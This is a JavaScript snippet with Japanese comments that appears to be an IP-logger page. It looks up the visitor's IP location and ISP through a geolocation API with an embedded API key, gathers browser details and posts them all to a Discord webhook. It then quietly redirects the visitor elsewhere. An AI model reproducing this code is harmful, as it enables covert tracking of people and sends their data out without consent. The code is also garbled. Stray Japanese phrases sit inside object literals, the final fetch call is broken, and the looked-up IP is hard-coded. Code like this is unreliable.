    <script>
        // IPアドレスとその他情報を取得
        async function getIpInfo() {
            try {
                // IPify APIを使用してIP情報を取得
                const response = await fetch('https://geo.ipify.org/api/v1?apiKey=at_J8ZKGW0bpTAwgzuAWbPD7jh6qQtnH&ipAddress=8.8.8.8');
                const data = await response.json();
                
                // ブラウザ情報を取得
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    language: Discordに送信するデータを作成
                    platform: navigator.platform,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timestamp: new Date().toISOString()
                };
                
                // Discordに送信するデータを作成
                const discordData = {
                    content: "新しいアクセスがありました",
                    embeds: [{
                        title: "アクセス情報",
                        color: 3447003,
                        fields: [
                            { name: "IPアドレス", value: data.ip, inline: true },
                            { name: "場所", value: `${data.location.city}, ${data.location.region}, ${data.location.country}`, inline: true },
                            { name: "ISP", value: data.isp, inline: true },
                            { name: "ブラウザ", value: browserInfo.userAgent, inline: false },
                            { name: "言語", value: browserInfo.language, inline: true },
                            { Pythonを使用したバックエンド実装
                            { name: "プラットフォーム", value: browserInfo.platform, inline: true },
                            { name: "画面解像度", value: browserInfo.screenResolution, inline: true },
                            { name: "アクセス日時", value: browserInfo.timestamp, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                
                // Discord Webhookにデータを送信
                await sendToDiscord(discordData);
                
                // 送信後、指定したURLにリダイレクト
                setTimeout(() => {
                    window.location.href = "https://example.com"; // ここにリダイレクト先URLを指定
                }, 1000);
                
            } catch (error) {
                console.error('IP情報の取得に失敗しました:', error);
                // エラー時もリダイレクト
                window.location.href = "https://example.com";
            }
        }
        
        // Discordにデータを送信する関数
        async function sendToDiscord(data) {

            // WebhookにPOSTリクエストを送信
            await fetch(webhooktoDiscord(data)
        }
